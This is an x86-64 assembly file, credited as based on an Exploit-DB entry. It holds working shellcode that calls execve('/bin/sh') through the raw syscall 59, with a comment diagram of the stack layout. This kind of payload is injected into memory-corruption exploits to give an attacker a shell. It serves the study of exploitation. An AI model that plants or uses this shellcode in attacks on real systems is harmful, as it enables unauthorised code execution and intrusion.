; Originally based on https://www.exploit-db.com/shellcodes/47008

; stack layout
;
;     ┏━━━━━━━━━━━━━━┓
;     ┃              v
;   [ argv0, NULL ] "/bin//sh" NULL
;     ^      ^       ^
;     ┃      ┃       ┃
;     argv   envp    filename

; execve("/bin/sh", ["/bin/sh"], [])
xor     rax, rax
xor     rsi, rsi
mov     rdi, 0x68732f2f6e69622f
push    rsi
push    rdi
mov     rdi, rsp
push    rsi
mov     rdx, rsp
push    rdi
mov     rsi, rsp
mov      al, 59
syscall
